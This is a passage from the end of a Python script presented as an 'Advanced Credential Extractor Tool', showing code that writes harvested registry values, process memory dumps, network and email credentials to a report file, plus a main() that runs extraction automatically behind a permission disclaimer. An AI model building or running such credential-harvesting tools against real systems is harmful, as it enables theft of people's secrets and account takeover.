                f.write("-" * 30 + "\n")
                for cred in self.extracted_credentials['registry_entries']:
                    f.write(f"Type: {cred['type']}\n")
                    f.write(f"Path: {cred['path']}\n")
                    f.write(f"Name: {cred['name']}\n")
                    f.write(f"Value: {cred['value']}\n\n")
                
                # Memory Dumps
                f.write("MEMORY DUMPS:\n")
                f.write("-" * 30 + "\n")
                for cred in self.extracted_credentials['memory_dumps']:
                    f.write(f"Type: {cred['type']}\n")
                    f.write(f"Process: {cred['process']}\n")
                    f.write(f"PID: {cred['pid']}\n")
                    f.write(f"Note: {cred['note']}\n\n")
                
                # Network Credentials
                f.write("NETWORK CREDENTIALS:\n")
                f.write("-" * 30 + "\n")
                for cred in self.extracted_credentials['network_credentials']:
                    f.write(f"Type: {cred['type']}\n")
                    f.write(f"Target: {cred['target']}\n\n")
                
                # Email Configs
                f.write("EMAIL CONFIGURATIONS:\n")
                f.write("-" * 30 + "\n")
                for cred in self.extracted_credentials['email_configs']:
                    f.write(f"Type: {cred['type']}\n")
                    f.write(f"Path: {cred['path']}\n")
                    f.write(f"Note: {cred['note']}\n\n")
                
                f.write("\n" + "=" * 60 + "\n")
                f.write("END OF ADVANCED REPORT\n")
                f.write("=" * 60 + "\n")
                
            self.log(f"Advanced credentials saved to: {filename}")
            return filename
            
        except Exception as e:
            self.log(f"Error saving advanced credentials to file: {e}")
            return None

def main():
    """Main application entry point"""
    try:
        print("=" * 60)
        print("ADVANCED CREDENTIAL EXTRACTOR TOOL")
        print("=" * 60)
        print("WARNING: This tool extracts sensitive credentials from your system.")
        print("Only use this tool on systems you own and have permission to access.")
        print("=" * 60)
        
        extractor = AdvancedCredentialExtractor()
        
        # Run extraction automatically
        extractor.extract_all_credentials()
        
        # Save to file
        filename = extractor.save_to_file()
        if filename:
            print(f"\nAdvanced extraction completed successfully!")
            print(f"Results saved to: {filename}")
            print("\nIMPORTANT SECURITY NOTES:")
            print("- The extracted file contains sensitive information")
            print("- Store it securely and delete it when no longer needed")
            print("- Do not share this file with unauthorized parties")
        else:
            print("Failed to save advanced credentials to file.")
            
    except KeyboardInterrupt:
        print("\nAdvanced extraction interrupted by user.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()